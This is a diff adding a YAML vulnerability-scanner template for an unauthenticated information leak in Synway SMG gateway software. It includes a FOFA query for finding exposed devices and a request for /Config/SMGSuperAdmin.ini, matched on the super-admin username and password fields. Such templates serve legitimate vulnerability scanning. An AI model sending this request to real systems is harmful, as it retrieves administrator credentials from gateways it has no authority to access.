@@ -1,0 +1,32 @@
+id: Synway-SMGSuperAdmin-Information-disclosure
+
+info:
+  name: 三汇SMG网关管理软件 SMGSuperAdmin 信息泄露漏洞
+  author: Superhero
+  severity: medium
+  description: |-
+    fofa: app="Synway-网关管理软件"
+    三汇SMG网关管理软件 SMGSuperAdmin 配置文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。
+  reference:
+    - https://mp.weixin.qq.com/s/b_eUjbaJmHNh5-NMg_jZ-g?token=968846615&lang=zh_CN
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /Config/SMGSuperAdmin.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[SuperUserInfo]'
+          - 'SuperUserName='
+          - 'SuperPwd='
+        condition: and
+      - type: status
+        status: 
+          - 200
